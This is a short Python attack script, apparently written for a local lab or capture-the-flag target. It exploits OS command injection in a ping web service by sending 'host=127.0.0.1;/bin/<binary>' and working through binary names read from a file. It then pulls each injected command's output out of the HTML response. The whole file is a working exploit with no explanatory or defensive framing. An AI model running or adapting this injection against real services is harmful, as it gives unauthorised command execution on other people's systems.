import requests
import os 
import re
# send to URL with host as parameter 


HOST = "127.0.0.1"
PORT = 11102

def extract_pre_regex(html):
    m = re.search(r'<pre\b[^>]*>(.*?)</pre>', html, flags=re.DOTALL | re.IGNORECASE)
    return m.group(1) if m else None

def extract_cmd_output(html):
    pre_content = extract_pre_regex(html)
    if pre_content:
        lines = pre_content.splitlines()
        # take lines after the line containing "rtt min/avg/max/mdev"
        for i, line in enumerate(lines):
            if "rtt min/avg/max/mdev" in line:
                return "\n".join(lines[i+1:])
    return None

def query(binpath):
    try:
        print(f"POST to http://{HOST}:{PORT}?host=")
        response = requests.post(f"http://{HOST}:{PORT}?host=127.0.0.1;/bin/{binpath}", timeout=10)
        if response.status_code == 200:
            print(response.text)
            cmd_output = extract_cmd_output(response.text)
            if cmd_output:
                print(f"[+] Command {binpath} output:\n{cmd_output}")
            return True
    except requests.RequestException:
        return False

if __name__ == "__main__":
    # read from ./bin_list.txt 
    with open("bin_list.txt", "r") as f:
        for line in f:
            bin_path = line.strip()
            if bin_path:
                print(f"[*] Try with binary: {bin_path}")
                query(bin_path)
